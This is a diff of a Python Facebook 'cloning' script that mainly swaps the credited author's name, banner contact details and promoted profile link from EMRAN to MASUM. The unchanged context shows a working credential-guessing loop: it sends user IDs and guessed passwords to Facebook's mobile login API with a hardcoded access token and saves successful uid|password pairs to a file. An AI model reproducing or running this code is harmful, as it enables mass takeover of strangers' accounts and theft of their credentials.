@@ -389,23 +389,23 @@ def follow(ses,coki):
 
 logo = ("""\033[1;32m      
   \033[38;5;46m╔═════════════════════════════════════╗
-  \033[38;5;46m║ \033[38;5;46mEMRANCYBER \033[38;5;46mEHC    EHC  \033[38;5;46m.dEHC8b.     ║
+  \033[38;5;46m║ \033[38;5;46mMASUMCYBER \033[38;5;46mEHC    EHC  \033[38;5;46m.dEHC8b.     ║
   \033[38;5;46m║ \033[38;5;46mEHC        \033[38;5;46mEHC    EHC \033[38;5;46md88P  Y88b    ║
   \033[38;5;46m║ \033[38;5;46mEHC        \033[38;5;46mEHC    EHC \033[38;5;46mEHC    EHC    ║
-  \033[38;5;46m║ \033[38;5;46mEHCEHC8    \033[38;5;46mEMRANCYBER \033[38;5;46mEHC           ║
+  \033[38;5;46m║ \033[38;5;46mEHCEHC8    \033[38;5;46mMASUMCYBER \033[38;5;46mEHC           ║
   \033[38;5;46m║ \033[38;5;46mEHC        \033[38;5;46mEHC    EHC \033[38;5;46mEHC           ║
   \033[38;5;46m║ \033[38;5;46mEHC        \033[38;5;46mEHC    EHC \033[38;5;46mEHC    EHC    ║
   \033[38;5;46m║ \033[38;5;46mEHC        \033[38;5;46mEHC    EHC \033[38;5;46mY88b  d88P    ║
-  \033[38;5;46m║ \033[38;5;46mEMRANCYBER \033[38;5;46mEHC    EHC  \033[38;5;46m"YEHC8P"     ║ 
+  \033[38;5;46m║ \033[38;5;46mMASUMCYBER \033[38;5;46mEHC    EHC  \033[38;5;46m"YEHC8P"     ║ 
   \033[38;5;46m╚═════════════════════════════════════╝
-\033[38;5;46m╔═════════════╗  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m╔══════════════════╗
-\033[38;5;46m║[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢K🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMasum          ║
-\033[38;5;46m║[🔵]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMasum     ║
-\033[38;5;46m║[🔵]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢S🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01303890092     ║
-\033[38;5;46m║[🔵]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢H🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMasum ║
-\033[38;5;46m║[🔵]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢X🌹⃝࿇  \033[38;5;46m║\033[38;5;46m Masum     ║
-\033[38;5;46m║[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢D🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
-\033[38;5;46m╚═════════════╝  ࿇⃝🌹⃢𝐆⃢🌹⃝࿇  \033[38;5;46m╚══════════════════╝\033[1;37m""")
+\033[38;5;46m╔═════════════╗  ࿇⃝🌹⃢M🌹⃝࿇  \033[38;5;46m╔══════════════════╗
+\033[38;5;46m║[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢D🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMasum          ║
+\033[38;5;46m║[🔵]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢M🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMasum     ║
+\033[38;5;46m║[🔵]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01303890092     ║
+\033[38;5;46m║[🔵]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢S🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMasum ║
+\033[38;5;46m║[🔵]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢U🌹⃝࿇  \033[38;5;46m║\033[38;5;46m Masum     ║
+\033[38;5;46m║[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢M🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
+\033[38;5;46m╚═════════════╝  ࿇⃝🌹⃢T🌹⃝࿇  \033[38;5;46m╚══════════════════╝\033[1;37m""")
 
 class Main:
 	def __init__(self):
@@ -422,7 +422,7 @@ class Main:
 		print(" [5]\033[38;5;46m2011-14 Cloning")
 		print(" [E]\033[38;5;46mExit Programming\n")
 		TALHA =input(" Choose ")
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100076838078407&mibextid=ZbWKwL/')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=61557310540905&mibextid=ZbWKwL/')
 		if TALHA in ["1", "01"]:
 			File()
 		if TALHA in ["2", "02"]:
@@ -834,7 +834,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ EMRAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ MASUM ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -851,10 +851,10 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ EMRAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MASUM-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-EMRAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-MASUM-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ EMRAN-ok ] %s | %s\033[0;97m         "%(uid, pw))
@@ -1261,7 +1261,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ EMRAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ MASUM ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
